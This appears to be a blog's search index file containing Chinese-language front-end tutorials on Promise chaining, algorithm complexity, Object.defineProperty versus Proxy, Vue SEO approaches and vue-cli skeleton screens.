<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[promise多个then、catch、finally情况]]></title>
    <url>%2Fblog%2Fes6%2Fpromise%E5%A4%9A%E4%B8%AAthen%E3%80%81catch%E3%80%81finally%E6%83%85%E5%86%B5.html</url>
    <content type="text"><![CDATA[结论先抛出结论，如下： 一个promise中，resolve、reject只会执行最先触发的那个，执行完就停止了 根据 resolve|reject 输出 then|catch、finally 多个resolve或多个reject只会执行第一个 Promise立即执行函数里面的其他语句不会受到resolve、reject影响 第一次then|catch、finally执行的是promise内部的结果 第一次then|catch的参数来自promise内部的resolve、reject，finally始终无参数 第二次及以后的then一定会执行，参数来自上一个then的返回值，无返回值时参数为undefined 第二次及以后的finally一定会执行，无参数，为undefined 第二次及以后的then中如果return Error，会被下一个then作为参数输出，finally始终无参数。只会影响下一个，不会影响下下个。 第二次如果是throw Error，则会被当前紧挨着的catch语句所捕获 即：return Error只是作为一个常规的返回值（值为Error），而throw则是直接抛出异常 在then中连续写两个回调，第一个参数为then，第二个参数为catch，在then后面再写一个catch。如果promise是resolve，在then的第一个参数中throw Error，会被下一个catch所捕获如果promise是reject，在then的第二个参数中throw Error，会被下一个catch所捕获 即：then…catch可以将两个回调都写在then里面，直接写两个参数，then后面的catch会被当前其他语句的catch，只有前面的then内部抛出异常才会执行。 分析case1_resovle1234567891011121314151617181920212223function testPromise1(val) &#123; return new Promise((resolve, reject) =&gt; &#123; resolve('成功！') reject('失败！') &#125;) .then((res) =&gt; &#123; console.log('First then:', res) &#125;) .catch((err) =&gt; &#123; console.log('First catch:', err) &#125;) .finally((res) =&gt; &#123; console.log('First finally', res) &#125;)&#125;testPromise1()/** * testPromise1 执行结果： * * First then: 成功！ * First finally: undefined */ case2_reject1234567891011121314151617181920212223function testPromise2(val) &#123; return new Promise((resolve, reject) =&gt; &#123; reject('失败！') resolve('成功！') &#125;) .then((res) =&gt; &#123; console.log('First then:', res) &#125;) .catch((err) =&gt; &#123; console.log('First catch:', err) &#125;) .finally((res) =&gt; &#123; console.log('First finally:', res) &#125;)&#125;testPromise2()/** * testPromise2 执行结果： * * First catch: 失败！ * First finally: undefined */ case1、case2结论： 一个promise中，resolve、reject只会执行最先触发的那个，执行完就停止了 根据 resolve|reject 先输出 promise 自己的then|catch、finall case3_多resolve、reject1234567891011121314151617181920212223242526272829303132333435function testPromise3(val) &#123; return new Promise((resolve, reject) =&gt; &#123; console.log('testPromise1_1') resolve('成功1！') console.log('testPromise1_2') reject('失败1！') console.log('testPromise1_3') resolve('成功2！') console.log('testPromise1_4') reject('失败2！') console.log('testPromise1_5') &#125;) .then((res) =&gt; &#123; console.log('First then:', res) &#125;) .catch((err) =&gt; &#123; console.log('First catch:', err) &#125;) .finally((res) =&gt; &#123; console.log('First finally:', res) &#125;)&#125;testPromise3()/** * testPromise3 执行结果： * * testPromise1_1 * testPromise1_2 * testPromise1_3 * testPromise1_4 * testPromise1_5 * First then: 成功1！ * First finally: undefined */ case3结论： 多个resolve或多个reject只会执行第一个 Promise立即执行函数里面的非resolve、reject语句不会受到resolve、reject影响 case4_多then、catch、finally无return123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function testPromise4(val) &#123; return new Promise((resolve, reject) =&gt; &#123; resolve('成功！') // 以下为第一次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('First then:', res) &#125;) .catch((err) =&gt; &#123; console.log('First catch:', err) &#125;) .finally((res) =&gt; &#123; console.log('First finally:', res) // 以下为第二次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Second then:', res) &#125;) .catch((err) =&gt; &#123; console.log('Second catch:', err) &#125;) .finally((res) =&gt; &#123; console.log('Second finally:', res) // 以下为第三次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Third then:', res) &#125;) .catch((err) =&gt; &#123; console.log('Third catch:', err) &#125;) .finally((res) =&gt; &#123; console.log('Third finally:', res) &#125;)&#125;// testPromise4()/** * testPromise4 执行结果： * * First then: 成功！ --- then参数值：来自promise内部的resolve参数 * First finally: undefined --- finally没有参数，为undefined * * Second then: undefined --- then参数值：来自第一个then的返回值，没有返回值为undefined * Second finally: undefined --- finally没有参数，为undefined * * Third then: undefined --- then参数值：来自第二个then的返回值，没有返回值为undefined * Third finally: undefined --- finally没有参数，为undefined */ case5_resolve引发多then、catch、finally有return123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function testPromise5(val) &#123; return new Promise((resolve, reject) =&gt; &#123; resolve('成功！') // 以下为第一次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('First then:', res) return 'From first then' &#125;) .catch((err) =&gt; &#123; console.log('First catch:', err) return 'From first catch' &#125;) .finally((res) =&gt; &#123; console.log('First finally:', res) return 'From first finally' // 以下为第二次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Second then:', res) return 'From second then' &#125;) .catch((err) =&gt; &#123; console.log('Second catch:', err) return 'From second catch' &#125;) .finally((res) =&gt; &#123; console.log('Second finally:', res) return 'From second finally' // 以下为第三次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Third then:', res) return 'From third then' &#125;) .catch((err) =&gt; &#123; console.log('Third catch:', err) return 'From third catch' &#125;) .finally((res) =&gt; &#123; console.log('Third finally:', res) return 'From third finally' &#125;)&#125;// testPromise5()/** * testPromise5 执行结果： * * First then: 成功！ --- then参数值：来自promise内部的resolve参数 * First finally: undefined --- finally没有参数，为undefined * * Second then: From first then --- then参数值：来自第一个then的返回值，没有返回值为undefined * Second finally: undefined --- finally没有参数，为undefined * * Third then: From second then --- then参数值：来自第二个then的返回值，没有返回值为undefined * Third finally: undefined --- finally没有参数，为undefined */ case6_reject引发多then、catch、finally有return12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function testPromise6(val) &#123; return new Promise((resolve, reject) =&gt; &#123; reject('失败！') // 以下为第一次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('First then:', res) return 'From first then' &#125;) .catch((err) =&gt; &#123; console.log('First catch:', err) return 'From first catch' &#125;) .finally((res) =&gt; &#123; console.log('First finally:', res) return 'From first finally' // 以下为第二次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Second then:', res) return 'From second then' &#125;) .catch((err) =&gt; &#123; console.log('Second catch:', err) return 'From second catch' &#125;) .finally((res) =&gt; &#123; console.log('Second finally:', res) return 'From second finally' // 以下为第三次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Third then:', res) return 'From third then' &#125;) .catch((err) =&gt; &#123; console.log('Third catch:', err) return 'From third catch' &#125;) .finally((res) =&gt; &#123; console.log('Third finally:', res) return 'From third finally' &#125;)&#125;testPromise6()/** * testPromise6 执行结果： * * First catch: 失败！ --- then参数值：来自promise内部的reject参数 * First finally: undefined --- finally没有参数，为undefined * * Second then: From first then --- then参数值：来自第一个then的返回值，没有返回值为undefined * Second finally: undefined --- finally没有参数，为undefined * * Third then: From second then --- then参数值：来自第二个then的返回值，没有返回值为undefined * Third finally: undefined --- finally没有参数，为undefined */ case4、case5、case6结论： 第一次then|catch、finally执行的是promise内部的结果 第一次then|catch的参数来自promise内部的resolve、reject，finally无参数 第二次及以后的then一定会执行，参数来自上一个then的返回值，无返回值为undefined 第二次及以后的finally一定会执行，无参数，为undefined case7_new Error1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function testPromise7(val) &#123; return new Promise((resolve, reject) =&gt; &#123; resolve('成功！') // 以下为第一次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('First then:', res) return new Error('From first then') &#125;) .catch((err) =&gt; &#123; console.log('First catch:', err) return 'From first catch' &#125;) .finally((res) =&gt; &#123; console.log('First finally:', res) return new Error('From first finally') // 以下为第二次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Second then:', res) return 'From second then' &#125;) .catch((err) =&gt; &#123; console.log('Second catch:', err) return 'From second catch' &#125;) .finally((res) =&gt; &#123; console.log('Second finally:', res) return 'From second finally' // 以下为第三次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Third then:', res) return 'From third then' &#125;) .catch((err) =&gt; &#123; console.log('Third catch:', err) return 'From third catch' &#125;) .finally((res) =&gt; &#123; console.log('Third finally:', res) return 'From third finally' &#125;)&#125;testPromise7()/** * testPromise7 执行结果： * * First then: 成功！ * First finally: undefined * Second then: Error: From first then at ... * Second finally: undefined * Third then: From second then * Third finally: undefined */ case8_throw Error1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859function testPromise8(val) &#123; return new Promise((resolve, reject) =&gt; &#123; resolve('成功！') reject('失败！') // 以下为第一次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('First then:', res) // return new Error('From first then') throw new Error('From first then') &#125;) .catch((err) =&gt; &#123; console.log('First catch:', err) return 'From first catch' &#125;) .finally((res) =&gt; &#123; console.log('First finally:', res) return new Error('From first finally') // 以下为第二次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Second then:', res) return 'From second then' &#125;) .catch((err) =&gt; &#123; console.log('Second catch:', err) return 'From second catch' &#125;) .finally((res) =&gt; &#123; console.log('Second finally:', res) return 'From second finally' // 以下为第三次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Third then:', res) return 'From third then' &#125;) .catch((err) =&gt; &#123; console.log('Third catch:', err) return 'From third catch' &#125;) .finally((res) =&gt; &#123; console.log('Third finally:', res) return 'From third finally' &#125;)&#125;testPromise8()/** * testPromise8 执行结果 * * First then: 成功！ * First catch: Error: From first then at ... * First finally: undefined * Second then: From first catch * Second finally: undefined * Third then: From second then * Third finally: undefined */ case7、case8结论： 第二次及以后的then中如果return Error，会被下一个then作为参数输出，finally始终无参数。只会影响下一个，不会影响下下个。 第二次如果是throw Error，则会被当前的catch语句所捕获 return Error只是作为一个常规的报错返回，而throw则是直接抛出异常 case9_then回调两个参数return Error123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function testPromise9(val) &#123; return new Promise((resolve, reject) =&gt; &#123; resolve('成功！') // 以下为第一次then、catch、finally &#125;) .then( (res) =&gt; &#123; console.log('First then:', res) throw new Error('From first then') &#125;, (err) =&gt; &#123; console.log('First catch1:', err) return 'From first catch2' &#125; ) .catch((err) =&gt; &#123; console.log('First catch2:', err) return 'From first catch2' &#125;) .finally((res) =&gt; &#123; console.log('First finally:', res) return new Error('From first finally') // 以下为第二次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Second then:', res) return 'From second then' &#125;) .catch((err) =&gt; &#123; console.log('Second catch:', err) return 'From second catch' &#125;) .finally((res) =&gt; &#123; console.log('Second finally:', res) return 'From second finally' &#125;)&#125;testPromise9()/** * testPromise9 执行结果： * * First then: 成功！ * First catch2: Error: From first then at ... * First finally: undefined * Second then: From first catch2 * Second finally: undefined */ case10_then回调两个参数throw Error12345678910111213141516171819202122232425262728293031323334353637383940414243444546function testPromise10(val) &#123; return new Promise((resolve, reject) =&gt; &#123; reject('失败！') &#125;) .then( (res) =&gt; &#123; console.log('First then:', res) &#125;, (err) =&gt; &#123; console.log('First catch1:', err) // return 'From first catch2' throw new Error('From first catch1') &#125; ) .catch((err) =&gt; &#123; console.log('First catch2:', err) return 'From first catch2' &#125;) .finally((res) =&gt; &#123; console.log('First finally:', res) return new Error('From first finally') // 以下为第二次then、catch、finally &#125;) .then((res) =&gt; &#123; console.log('Second then:', res) return 'From second then' &#125;) .catch((err) =&gt; &#123; console.log('Second catch:', err) return 'From second catch' &#125;) .finally((res) =&gt; &#123; console.log('Second finally:', res) return 'From second finally' &#125;)&#125;testPromise10()/** * testPromise10 执行结果： * * First catch1: 失败！ * First catch2: Error: From first then at ... * First finally: undefined * Second then: From first catch2 * Second finally: undefined */ case11_then回调三个参数1234567891011121314151617181920212223function testPromise11 (val) &#123; return new Promise((resolve, reject) =&gt; &#123; reject('失败！') resolve('成功！') &#125;).then(res =&gt; &#123; console.log('First then:', res) &#125;, err =&gt; &#123; console.log('First catch1:', err) &#125;, () =&gt; &#123; console.log('First finally1:', err) &#125;).catch(err =&gt; &#123; console.log('First catch2:', err) &#125;).finally(res =&gt; &#123; console.log('First finally2:', res) &#125;)&#125;testPromise11()/** * 执行结果 * * First catch1: 失败！ * First finally2: undefined */ case9、case10结论： 在then中连续写两个回调，第一个参数为then，第二个参数为catch，在then后面再写一个catch。 如果是resolve，在then的第一个参数中throw Error，会被下一个catch所捕获 如果是reject，在then的第二个参数中throw Error，会被下一个catch所捕获 即：then…catch可以将两个回调都赋给then，直接写两个参数，then后面的catch会被当前其他的catch，只有前面的then内部抛出异常才会执行。]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[程序复杂度]]></title>
    <url>%2Fblog%2Fjavascript%2F%E7%A8%8B%E5%BA%8F%E5%A4%8D%E6%9D%82%E5%BA%A6.html</url>
    <content type="text"><![CDATA[参考：知乎 算法的时间与空间复杂度 时间维度：是指执行当前算法所消耗的时间，我们通常用「时间复杂度」来描述。空间维度：是指执行当前算法需要占用多少内存空间，我们通常用「空间复杂度」来描述。 常用的时间复杂度从上往下越来越复杂 常数阶 O(1)无论多少代码，只有没有循环等结构，复杂度均为O(1)。 12345let i = 1let j = 2++ij++let m = i + j 对数阶 O(logN)，log以2为底索引每次循环*2，即使log2(n)次二分查找也是一个典型的对数阶复杂度，每查找一次就排除一半，n个数据只需要查找log2(n)次 123for (let i = 0; i &lt; len; i++) &#123; i = i * 2&#125; 线性阶 O(n)简单一层循环，执行n遍，复杂度为O(n) 123for(let i = 0; i &lt; n; i++)&#123; // ...&#125; 线性对数阶 O(n * logN)外面一层循环，连一层二分循环 12345for(let i = 0; i &lt; n; i++)&#123; for(let j = 0; j &lt; m; j++)&#123; j = j * 2 &#125;&#125; 平方阶 O(n^2)简单两层循环，执行n^2遍，复杂度为O(n^2) 12345for(let i = 0; i &lt; n; i++)&#123; for(let j = 0; j &lt; m; j++)&#123; // ... &#125;&#125; 立方阶 O(n^3)同上 k次方阶 O(n^k)同上 指数阶 O(2^n)略 常用的空间复杂度待补充… 参考：知乎 算法的时间与空间复杂度]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Object.defineProperty和Proxy对比]]></title>
    <url>%2Fblog%2Fjavascript%2FObject.defineProperty%E5%92%8CProxy%E5%AF%B9%E6%AF%94.html</url>
    <content type="text"><![CDATA[Object.definePropertyObject.defineProperty 会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性，并返回此对象。 先看一个demo:123456789101112const object = &#123;&#125;Object.defineProperty(object, 'property1', &#123; value: 20, writable: false // 定义该属性不可改&#125;)console.log(object)// &#123; property1: 20 &#125;object.property1 = 30// &#123; property1: 20 &#125; 语法1Object.defineProperty(obj, prop, descriptor) 参数 obj要定义的对象 prop要定义或修改的属性名称（或Symbol） descriptor要定义或修改的属性描述符（数据描述符、存取描述符） 数据描述符包含： configurable(false)为 true 时，该属性的描述符才能够被改变，也能删除 enumerable(false)为 true 时，该属性才会出现在对象的枚举属性中（被 for...in、Object.keys 访问） value(undefined)该属性对应的值 writable(false)为 true 时，才可改 存取描述符包含： get(undefined)属性的 getter 函数，当访问该属性时，会调用此函数。 set(undefined)属性的 setter 函数，当属性值被修改时，会调用此函数。 注意： 如果一个描述符不具有 value、writable、get、set 中的任意一个键，它会被认为是一个数据描述符。 如果一个描述符同时拥有 value 或 writable 和 get 或 set 键，它会抛出异常。 123456789101112131415161718var o = &#123;&#125;;o.a = 1;// 等同于：Object.defineProperty(o, "a", &#123; value: 1, writable: true, configurable: true, enumerable: true&#125;);Object.defineProperty(0, "a", &#123; value: 1 &#125;)// 等同于Object.defineProperty(o, "a", &#123; value: 1, writable: false, configurable: false, enumerable: false&#125;); 自定义 Setters 和 Getters123456789101112131415161718192021222324function Archiver() &#123; var temp = null var archive = [] Object.defineProperty(this, 'temp', &#123; get () &#123; console.log('get') return temp &#125;, set (value) &#123; temp = value archive.push(&#123; val: temp &#125;) &#125; &#125;) this.getArchive = function () &#123; return archive &#125;&#125;var arc = new Archiver()arc.temp // 'get', nullarc.temp = 11arc.temp = 13arc.getArchive() // [&#123;val: 11&#125;, &#123;val: 13&#125;] 继承属性1234567891011121314151617function MyClass() &#123;&#125;var value;Object.defineProperty(MyClass.prototype, 'x', &#123; get () &#123; return value &#125;, set (newValue) &#123; value = newValue &#125;&#125;)var a = new MyClass()var b = new MyClass()a.x = 1 // a.__proto__ 和 MyClass.prototype 相等console.log(a.x, b.x) // 1 1 可以通过将值存储在另一个属性中解决。在 get 和 set 方法中，this 指向某个被访问和修改属性的对象123456789101112131415161718function MyClass() &#123;&#125;Object.defineProperty(MyClass.prototype, 'x', &#123; get () &#123; return this.stored_x &#125;, set (newValue) &#123; this.stored_x = newValue &#125;&#125;)var a = new MyClass()var b = new MyClass()a.x = 1console.log(a.x, b.x) // 1 undefined// this指向MyClass.prototype对象 ProxyProxy 对象用于创建一个对象的代理，从而实现基本操作的拦截和自定义。 语法1const p = new Proxy(target, handler) 参数 target要使用 Proxy 包装的目标对象，可以是对象、数组、函数，甚至是另外一个代理 handler一个通常以函数为属性的对象 基础示例12345678910const p = new Proxy(&#123;&#125;, &#123; get (obj, prop) &#123; return prop in obj ? obj[prop] : 30 // 存在即返回，不存在就返回30 &#125;&#125;)p.a = 1p.b = undefinedconsole.log(p.a, p.b) // 1, undefinedconsole.log('c' in p, p.c) // false, 30 无操作转发代理12345const target = &#123;&#125;const p = new Proxy(target, &#123;&#125;)p.a = 30 // p代理会将所有的操作都转发到这个对象上console.log(p.a, target.a) // 30, 30 vue2.x在 vue2.x 中，双向绑定是通过监听对象的get和set操作来实现的。即是 Object.defineProperty12345678910111213141516const obj = &#123; a: 1&#125;let val = 1let newVal = 2Object.defineProperty(obj, 'a', &#123; get () &#123; console.log('数据被获取') return val &#125;, set (newVal) &#123; console.log('数据被修改/设置') val = newVal &#125;&#125;) 每当我们获取 obj 的 a 属性或设置 a 属性时，都会被劫持。在 vue2.x 中正是采用这种监听方式使用发布-订阅模式，data 上的数据是发布方，而试图的修改是订阅方，每当数据发生修改时，就会发布信息，而订阅方接受到相应的信息，就会对视图进行修改。 下面简单模拟一下发布-订阅的流程：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const publisher = function () &#123; return &#123; currentList: [], add (subscriber) &#123; this.currentList.push(subscriber) console.log('添加订阅', this.currentList) // [&#123; receiveText()&#123;&#125; &#125;, ..] &#125;, publish (key, content) &#123; const currentList = this.currentList console.log('订阅集合', currentList) // 遍历订阅者的数组 for (let i = 0; i &lt; currentList.length; i++) &#123; currentList[i].receiveText(key, content) &#125; &#125; &#125;&#125;const subscriber = function (name) &#123; return &#123; receiveText (key, content) &#123; console.log(`视图$&#123;key&#125;已更新，相应的内容为$&#123;content&#125;`) &#125; &#125;&#125;// 将data作为发布方const data = publisher()// 将视图修改作为订阅方const change = subscriber()// 让视图修改订阅data的更新data.add(change)data._a = 1Object.defineProperty(data, 'a', &#123; get () &#123; return data._a &#125;, set (newVal) &#123; data.publish('a', newVal) data._a = newVal &#125;&#125;)// testdata.a // 1 返回data._a的数据data.a = 10 // vue3.0虽然 Object.defineProperty 可以实现双向绑定的效果，但是在 Proxy 出现后，它就被替代掉了。Object.defineProperty 只能一个属性一个属性的监听，也就是说，对于 data 对象，我们需要进行深度遍历，去监听每一个属性的变化，而一旦我们对data一个比较深的对象直接修改它的值，又得对其进行重新的遍历，非常损耗性能。而 Proxy 可以监听一整个对象，且基于 Proxy 的监听，只有当一个数据被用到的时候，才会去监听它，所以它在监听上大大降低了性能的损耗。 12345678910const p = new Proxy(&#123;&#125;, &#123; get (target, property, receiver) &#123; console.log(`getting $&#123;key&#125;`) return Reflect.get(target, property, receiver) &#125;, set (target, property, value, receiver) &#123; console.log(`setting $&#123;key&#125;`) return Reflect.set(target, property, value, receiver) &#125;&#125;) 模拟发布-订阅1var publisher]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue技术栈如何支持SEO]]></title>
    <url>%2Fblog%2Fvue%2Fvue%E6%8A%80%E6%9C%AF%E6%A0%88%E5%A6%82%E4%BD%95%E6%94%AF%E6%8C%81SEO.html</url>
    <content type="text"><![CDATA[vue 渐进式先简单回顾一下 vue 技术栈，在渐进式（对使用者的要求，逐渐添加）的思想上我们可以逐渐添加Components、Vue-Router、Vuex，它们之间相互独立，互不影响 渐进步骤： 下面介绍几种常见的vue seo方案： 实现方案简单html毫无疑问，即按照最简单的html书写方式，一个页面即一个html，多见于一些后端同学编写的后台系统页面。本质上和vue没有多大关系，对于前端同学，此种方案几乎不考虑。 prerender-spa-plugin对于使用 vue-cli 初始化的项目，如果只是需要改善少数营销页面（例如 /，/about，/news）的SEO，那么可能预渲染（prerender）更加适用。无需使用 web 服务器实时动态编译 HTML，而是使用预渲染方式，在构建时 (build time) 简单地生成针对特定路由的静态 HTML 文件。 我们可以使用 prerender-spa-plugin 轻松地添加预渲染。只适用于 history 模式，hash 不可用。 工作流程如下： 使用方式如下： 初始化 vue-cli 脚手架 安装插件 1npm i prerender-spa-plugin -S 注：插件内置安装了 puppeteer，所以安装过程比较慢 修改main.js 12345678new Vue(&#123; el: '#app', render: h =&gt; h(App), mounted () &#123; // You'll need this for renderAfterDocumentEvent. document.dispatchEvent(new Event('render-event')) &#125;&#125;) 应用插件build/webpack.prod.conf.js 添加插件： 1234567891011121314151617181920const PrerenderSPAPlugin = require('prerender-spa-plugin')const Renderer = PrerenderSPAPlugin.PuppeteerRenderer// prerendernew PrerenderSPAPlugin(&#123; // 生成文件的路径，也可以与webpakc打包的一致。 // 下面这句话非常重要！！！ // 这个目录只能有一级，如果目录层次大于一级，在生成的时候不会有任何错误提示，在预渲染的时候只会卡着不动。 staticDir: path.join(__dirname, '../dist'), // 对应自己的路由文件，比如index有参数，就需要写成 /index/param1 routes: [ '/', '/user' ], renderer: new Renderer(&#123; inject: &#123; foo: 'bar' &#125;, headless: true, // 在 main.js 中 document.dispatchEvent(new Event('render-event'))，两者的事件名称要对应上 renderAfterDocumentEvent: 'render-event' &#125;)&#125;) 为了更方便的测试dist 1npm i http-server -S 再添加scripts: 1"serve": "http-server ./dist" 更好的SEO vue-meta-info main.js: 123import MetaInfo from 'vue-meta-info'Vue.use(MetaInfo) 组件中： 123456789101112131415export default &#123; metaInfo: &#123; title: '我是一个title', meta: [ &#123; name: 'keywords', content: '关键字1,关键字2,关键字3' &#125;, &#123; name: 'description', content: '这是一段网页的描述' &#125; ] &#125;&#125; ssr官方文档 与传统的SPA（Single-Page Application - 单页应用程序）相比，服务端渲染（SSR）的优势主要在于： 更好的SEO 更快的内容到达时间（time-to-content） 使用服务端渲染（SSR）时还需要一些权衡之处： 开发条件有限。浏览器特定的代码，只能在某些生命周期钩子函数（lifecycle hook）中使用，一些外部扩展库（external library）可能需要特殊处理，才能在服务端渲染应用程序中运行。 涉及构建设置和部署的更多要求。与可以部署在任何静态文件服务器上的完全静态单页面应用程序(SPA)不同，服务器渲染应用程序，需要处于 Node.js server 运行环境。 更多的服务器负载。在 Node.js 中渲染完整的应用程序，显然会比仅仅提供静态文件的 server 更加大量占用 CPU 资源(CPU-intensive - CPU 密集)，因此如果你预料在高流量环境(high traffic)下使用，请准备相应的服务器负载，并明智地采用缓存策略。 在对你的应用程序使用服务器端渲染(SSR)之前，你应该问的第一个问题是，是否真的需要它。这主要取决于内容到达时间(time-to-content)对应用程序的重要程度。例如，如果你正在构建一个内部仪表盘，初始加载时的额外几百毫秒并不重要，这种情况下去使用服务器端渲染(SSR)将是一个小题大作之举。然而，内容到达时间(time-to-content)要求是绝对关键的指标，在这种情况下，服务器端渲染(SSR)可以帮助你实现最佳的初始加载性能。 vue官方对于ssr方案提供了集成的框架 nuxt.js，下面介绍nuxt.js。 nuxt.jsnuxt.js 提供了两种模式，一种 generate 静态化模式，一种 build node渲染模式。 generate模式generate 本质上是提前将vue组件的内容编译输出到对应的html中，属于前置输出，适用于静态化的网站，只有一些简单的文字内容，搭配一下简单的接口（接口无需seo）。 另外不适用与动态路由，如/news/1234567，1234567为动态id，因为想用访问/news/1234567，就必须提前输出这个html页面。部分网友提供解决方案，在执行 npm run generate 的时候通过请求获取id list，然后输出html。其实仔细思量后会发现这种方案几乎不可用，对于绝大多数网站，都存在登录态鉴权的问题，无法实现生成html。 对于这种复杂的应用场景，我们可以采用nuxt.js node渲染模式，如下： build模式对于需要频繁的接口请求，并且需要针对首屏数据做服务端渲染时，可以选用nuxt.js build模式，输入后置输出，再请求页面的时候，node层动态生成内容返回。 本地开发时执行 npm run dev，本地开发完，先执行 npm run build，生成编译文件，也可以选择在服务器端执行 npm run build，然后在服务器端执行 npm run start，启动服务。]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-cli添加骨架屏]]></title>
    <url>%2Fblog%2Fvue%2Fvue-cli%E6%B7%BB%E5%8A%A0%E9%AA%A8%E6%9E%B6%E5%B1%8F.html</url>
    <content type="text"><![CDATA[什么是骨架屏？骨架屏（Skeleton Screen）是指在页面数据加载完成前，先给用户展示出页面的大致结构（一般是灰色占位图，可以搭配一些动效），在拿到接口数据后渲染出实际页面内容然后替换掉。 比起简单的全局loading，这种灰色占位图描绘了页面的大致结构，对用户的心理会有一定的缓解。在数据回传之后，过滤也会更加流畅，给人一种页面内容”已经渲染出一部分“的感觉，用户体验更佳。 骨架屏的内容可以是base64的图片url，也可以是自行编写的dom结构，如果是dom结构，还可以自行实现一些动效，如光源从左扫到右，用动效来吸引用户，让用户忘记白屏时间。 近几年越来越多的应用采用骨架屏Skeleton，如：饿了么H5、知乎等。 骨架屏的实现方案目前有以下几种实现方案： 利用ssr实现根据编写的vue文件，手动生成，比较麻烦，不推荐 vue-skeleton-webpack-plugin根据编写的vue文件，按照路由给对应的页面设置，推荐单页面使用 page-skeleton-webpack-plugin只支持 history 模式，利用 Puppeteer 读取页面结构，生成骨架屏页面。实测生成的不太稳定，还在研究中。 dps可以对任意的页面（包括dev页面），生成对应的骨架屏，推荐多页面使用 利用ssr实现原理：事先在 &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; 中间添加骨架屏dom，等接口数据获取完毕后会自动替换调结构，达到渲染的目的。 使用 vue-cli 初始化 添加 src/skeleton.entry.js 123456789import Vue from 'vue'import Skeleton from './Skeleton.vue'export default new Vue(&#123; components: &#123; Skeleton &#125;, template: '&lt;skeleton /&gt;'&#125;) 添加 src/Skeleton.vue 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;template&gt; &lt;div class="skeleton page"&gt; &lt;div class="skeleton-nav"&gt;&lt;/div&gt; &lt;div class="skeleton-swiper"&gt;&lt;/div&gt; &lt;ul class="skeleton-tabs"&gt; &lt;li v-for="i in 8" class="skeleton-tabs-item"&gt;&lt;span&gt;&lt;/span&gt;&lt;/li&gt; &lt;/ul&gt; &lt;div class="skeleton-banner"&gt;&lt;/div&gt; &lt;div v-for="i in 6" class="skeleton-productions"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;style&gt;.skeleton &#123; position: relative; height: 100%; overflow: hidden; padding: 15px; box-sizing: border-box; background: #fff;&#125;.skeleton-nav &#123; height: 45px; background: #eee; margin-bottom: 15px;&#125;.skeleton-swiper &#123; height: 160px; background: #eee; margin-bottom: 15px;&#125;.skeleton-tabs &#123; list-style: none; padding: 0; margin: 0 -15px; display: flex; flex-wrap: wrap;&#125;.skeleton-tabs-item &#123; width: 25%; height: 55px; box-sizing: border-box; text-align: center; margin-bottom: 15px;&#125;.skeleton-tabs-item span &#123; display: inline-block; width: 55px; height: 55px; border-radius: 55px; background: #eee;&#125;.skeleton-banner &#123; height: 60px; background: #eee; margin-bottom: 15px;&#125;.skeleton-productions &#123; height: 20px; margin-bottom: 15px; background: #eee;&#125;&lt;/style&gt; 安装 vue-server-renderer 1npm install vue-server-renderer -D 添加 build/webpack.skeleton.conf.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546const path = require('path')const webpack = require('webpack')const nodeExternals = require('webpack-node-externals')const VueSSRServerPlugin = require('vue-server-renderer/server-plugin')module.exports = &#123; target: 'node', entry: &#123; skeleton: '../src/skeleton.entry.js' &#125;, output: &#123; path: path.resolve(__dirname, './dist'), publicPath: '/dist/', filename: '[name].js', libraryTarget: 'commonjs2' &#125;, module: &#123; rules: [ &#123; test: /\.css$/, use: [ 'vue-style-loader', 'css-loader' ] &#125;, &#123; test: /\.vue$/, loader: 'vue-loader' &#125; ] &#125;, externals: nodeExternals(&#123; allowlist: /\.css$/ &#125;), resolve: &#123; alias: &#123; 'vue$': 'vue/dist/vue.esm.js' &#125;, extensions: ['*', '.js', '.vue', '.json'] &#125;, plugins: [ new VueSSRServerPlugin(&#123; filename: 'skeleton.json' &#125;) ]&#125; 根目录下添加 skeleton.js 1234567891011121314const fs = require('fs')const &#123; resolve &#125; = require('path')const createBundleRenderer = require('vue-server-renderer').createBundleRenderer// 读取`skeleton.json`，以`index.html`为模板写入内容const renderer = createBundleRenderer(resolve(__dirname, './dist/skeleton.json'), &#123; template: fs.readFileSync(resolve(__dirname, './index.html'), 'utf-8')&#125;)// 把上一步模板完成的内容写入（替换）`index.html`renderer.renderToString(&#123;&#125;, (err, html) =&gt; &#123; fs.writeFileSync('index.html', html, 'utf-8')&#125;) 修改入口文件 index.html 123&lt;div id="app"&gt; &lt;!--vue-ssr-outlet--&gt;&lt;/div&gt; 修改 package.json 1"skeleton": "webpack --config ./webpack.skeleton.conf.js" 执行webpack 1npm run skeleton 此时，在dist目录会生成一个 skeleton.json 文件 自动重写 index.html 